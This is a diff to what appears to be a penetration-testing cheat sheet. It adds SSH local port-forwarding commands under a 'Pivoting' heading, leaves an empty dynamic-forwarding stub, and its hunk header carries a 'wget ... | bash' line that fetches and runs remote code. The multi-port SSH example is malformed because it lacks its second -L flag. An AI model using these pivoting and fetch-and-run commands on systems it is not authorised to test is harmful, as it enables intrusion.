@@ -532,6 +532,14 @@ wget -q0- <Target File URL> | bash
   ```
   
 ### Pivoting
-### 
-
-## Testing the Top 10 Web Application Vulnerabilities
+#### Local Port Forward a Single Port with SSH
+  ```sh
+  ssh -L <LPORT>:localhost:<RPORT> <user>@<IP>
+  ```
+#### Local Port Forward Multiple Ports with SSH
+  ```sh
+  ssh -L <LPORT>:localhost:<RPORT> <LPORT>:localhost:<RPORT> <user>@<IP>
+  ```
+#### Dynamic Port Forward with SSH and Proxychains
+  
+  ## Testing the Top 10 Web Application Vulnerabilities
